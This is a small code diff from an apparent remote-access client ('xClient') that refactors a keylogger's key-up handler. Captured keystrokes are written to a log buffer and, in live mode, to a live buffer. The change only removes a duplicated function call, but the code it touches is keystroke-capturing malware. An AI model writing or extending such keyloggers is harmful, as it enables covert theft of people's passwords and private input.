@@ -182,12 +182,12 @@ namespace xClient.Core.Utilities
 
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
-            var key = _pressedKeys.ToArray();
+            string specialKeys = HighlightSpecialKeys(_pressedKeys.ToArray());
 
-            _logFileBuffer.Append(HighlightSpecialKeys(key));
+            _logFileBuffer.Append(specialKeys);
 
             if (LiveModeEnabled)
-                _liveKeyEventBuffer.Append(HighlightSpecialKeys(key));
+                _liveKeyEventBuffer.Append(specialKeys);
 
             _pressedKeyChars.Clear();
         }
